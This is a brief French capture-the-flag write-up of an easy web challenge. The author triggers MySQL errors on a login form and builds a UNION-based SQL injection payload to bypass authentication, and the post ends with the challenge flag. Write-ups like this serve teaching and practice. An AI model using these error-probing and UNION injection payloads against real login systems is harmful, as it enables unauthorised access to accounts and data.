# EZ CTF

## Web

### Super Secure

**Difficulté :** Facile

**Enoncé :** C'est tellement incassable ! 

***

Le challenge consiste à bypass l'authentification via une SQLi.

Je commence par tester des payloads courts afin de trouver un point d'entrée.

Je récupère une erreur intérrésante avec un simple `'` :

```sql
Could not successfully run query (SELECT * FROM members WHERE username = ''' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e'' at line 1
```

Grâce aux erreurs renvoyées par le serveur, je vais pouvoir constuire mon payload.

Je tente donc d'exploit la SQLi avec une requête UNION : `1' UNION SELECT null-- -`

```sql
Could not successfully run query (SELECT * FROM members WHERE username = '1' UNION SELECT null-- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: The used SELECT statements have a different number of columns
```

Le message d'erreur retourné nous informe qu'il y a plusieurs colonnes.

Je vais donc ajuster mon payload pour satisfaire le nombre de colonne en rajoutant des valeurs `null` : 

```sql
1' UNION SELECT null,null,null-- -
```

![image](https://user-images.githubusercontent.com/49941629/167300247-9600e52e-ba68-4b0c-8dfb-454aba2d522e.png)

Flag : EZ-CTF{N0t_S0_S4f3_4ft3r_411}
